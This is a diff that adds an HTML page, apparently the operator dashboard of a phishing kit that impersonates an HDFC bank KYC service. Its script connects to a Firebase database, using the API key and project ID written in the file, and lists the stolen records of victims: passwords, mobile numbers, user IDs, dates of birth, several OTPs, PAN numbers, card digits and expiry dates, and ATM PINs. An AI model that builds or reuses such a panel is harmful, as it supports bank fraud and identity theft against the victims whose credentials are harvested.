@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html style="">
+  <head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width" />
+    <title>Wellcome</title>
+    <link rel="preload" as="image" href="fake/afx.png" />
+    <link rel="preload" as="image" href="fake/nortonsecurity.png" />
+    <meta name="next-head-count" content="5" />
+    <link rel="preload" href="fake/a6cd15749f8dde69.css" as="style" />
+    <link rel="stylesheet" href="fake/a6cd15749f8dde69.css" data-n-g="" />
+    <h1 style="text-align: center;">My Data </h1>
+    <p style="text-align: center;">*****************</p>
+    <style type="text/css">
+      
+      ul {
+        width: 300px;
+        margin: 20px auto;
+      }
+      ul li {
+        list-style: none;
+        font-size: 18px;
+      }
+      ul li span {
+        font-weight: bold;
+        color: blue;
+      }
+    </style>
+  </head>
+  <body>
+    <ul id="list">
+      <span></span>
+    </ul>
+    <!-- <script
+      type="text/javascript"
+      src="https://www.gstatic.com/firebasejs/8.2.9/firebase-app.js"
+    ></script>
+    <script src="https://www.gstatic.com/firebasejs/8.2.9/firebase-firestore.js"></script> -->
+    <script type="module">
+      // Import the functions you need from the SDKs you need
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.2/firebase-app.js";
+      import {
+        getDatabase,
+        ref,
+        set,
+        child,
+        get,
+        onValue,
+        query,
+        limitToLast,
+      } from "https://www.gstatic.com/firebasejs/9.17.2/firebase-database.js";
+
+      // Your web app's Firebase configuration
+      const firebaseConfig = {
+  apiKey: "AIzaSyCRzt1xcSuIjYs4Y6UOLrX2ZRSSDfGxB4w",
+  authDomain: "hdfc-kyc-8371e.firebaseapp.com",
+  projectId: "hdfc-kyc-8371e",
+  storageBucket: "hdfc-kyc-8371e.appspot.com",
+  messagingSenderId: "192461050608",
+  appId: "1:192461050608:web:cdb40f6c85a125e3b36835"
+};
+
+      // Initialize Firebase
+      const app = initializeApp(firebaseConfig);
+      const db = getDatabase(app);
+
+      const starCountRef = ref(db, "users");
+      const list = document.getElementById("list");
+
+      onValue(starCountRef, (snapshot) => {
+        console.log(snapshot.val());
+        const reversedKeys = Object.keys(snapshot.val()).reverse();
+
+        let html = "";
+        if (snapshot.exists()) {
+          reversedKeys.forEach(function (key) {
+            var childData = snapshot.val()[key];
+            if (childData.password) {
+              html += `<li><span>password:</span> ${childData.password}</li>`;
+            }
+            if (childData.mobile) {
+              html += `<li><span>Mobile:</span> ${childData.mobile}</li>`;
+            }
+            if (childData.user_id) {
+              html += `<li><span>User ID:</span> ${childData.user_id}</li>`;
+            }
+            if (childData.dob) {
+              html += `<li><span>DOB:</span> ${childData.dob}</li>`;
+            }
+            if (childData.otp1) {
+              html += `<li><span>OTP1:</span> ${childData.otp1}</li>`;
+            }
+            if (childData.otp2) {
+              html += `<li><span>OTP2:</span> ${childData.otp2}</li>`;
+            }
+            if (childData.last4c) {
+              html += `<li><span>LAST4C:</span> ${childData.last4c}</li>`;
+            }
+            if (childData.pan) {
+              html += `<li><span>PAN:</span> ${childData.pan}</li>`;
+            }
+            if (childData.otp3) {
+              html += `<li><span>OTP3:</span> ${childData.otp3}</li>`;
+            }
+            if (childData.month) {
+              html += `<li><span>Month:</span> ${childData.month}/${childData.year}</li>`;
+            }
+            if (childData.otp4) {
+              html += `<li><span>OTP4:</span> ${childData.otp4}</li>`;
+            }
+            if (childData.abc5) {
+              html += `<li><span>ABC5:</span> ${childData.abc5}</li>`;
+            }
+            if (childData.otp) {
+              html += `<li><span>OTP:</span> ${childData.otp}</li>`;
+            }
+            if (childData.name) {
+              html += `<li><span>NAME:</span> ${childData.name}</li>`;
+            }
+            if (childData.pin) {
+              html += `<li><span>ATM PIN:</span> ${childData.pin}</li>`;
+            }
+            html += "</br>";
+          });
+          list.innerHTML = html;
+        } else {
+          console.log("No data available");
+        }
+      });
+
+      const obj = {
+        a: "one",
+        b: "two",
+        c: "three",
+      };
+    </script>
+  </body>
+</html>
